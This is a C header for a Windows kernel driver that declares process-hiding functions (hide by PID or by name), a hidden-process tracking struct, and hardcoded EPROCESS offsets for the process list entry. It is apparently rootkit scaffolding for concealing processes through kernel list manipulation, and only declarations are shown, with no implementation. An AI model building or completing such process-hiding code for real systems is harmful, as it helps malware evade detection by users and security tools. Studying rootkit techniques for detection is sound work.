#pragma once 
#include<ntddk.h>
#include<wdm.h>
#include <ntimage.h>
#include <intrin.h>
#define PROCESS_NAME_OFFSET 0x450
#define PROCESS_PID_OFFSET 0x2e0
#define LIST_ENTRY_OFFSET 0x2e8
#define THREADS_LIST_OFFSET 0x488

#define MAX_HIDDEN_COUNT 100
#define PBYTE char*



typedef struct hidden_process {
	ULONG pid;
	PEPROCESS eprocess;

}hidden_process, *phidden_process;


ULONG get_pid(PEPROCESS process);
PUCHAR get_name(PEPROCESS process);
PEPROCESS get_next_process(PEPROCESS process);
PEPROCESS get_prev_process(PEPROCESS process);
NTSTATUS iterate_eprocess_list(PEPROCESS starting_process);
NTSTATUS hide_process_by_pid(ULONG pid,PEPROCESS starting_process);
NTSTATUS hide_process_by_name(PUCHAR name,PEPROCESS starting_process);
NTSTATUS add_process(PEPROCESS process);
BOOLEAN add_process_to_hidden_processes(PEPROCESS process_to_hide);
BOOLEAN is_process_hidden(PEPROCESS process_to_hide);
